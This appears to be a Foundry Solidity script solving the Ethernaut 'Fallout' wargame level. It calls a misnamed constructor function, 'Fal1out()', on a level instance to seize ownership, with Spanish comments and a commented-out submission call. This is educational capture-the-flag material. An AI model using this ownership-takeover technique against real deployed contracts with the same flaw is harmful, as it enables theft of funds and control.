// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut.sol";
import "../src/Fallback/Fallback.sol";

contract FalloutScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        // Fallback instance
        address instance = 0x9caD87094EDa0D81630a3Ee87f2E62A8d291C645; // TODO: Poner la direccion de la instancia del Delegation de ethernaut
        
        // Hack
        (bool fal1out_success, bytes memory fal1out_data) = instance.call(abi.encodeWithSignature("Fal1out()"));
        assert(fal1out_success);

        // Llamar al ethernauta con la address de la instancia para validar
        // Ethernaut ethernaut = Ethernaut(0xD991431D8b033ddCb84dAD257f4821E9d5b38C33);
        // ethernaut.submitLevelInstance(payable(instance));
        
        vm.stopBroadcast();
    }
}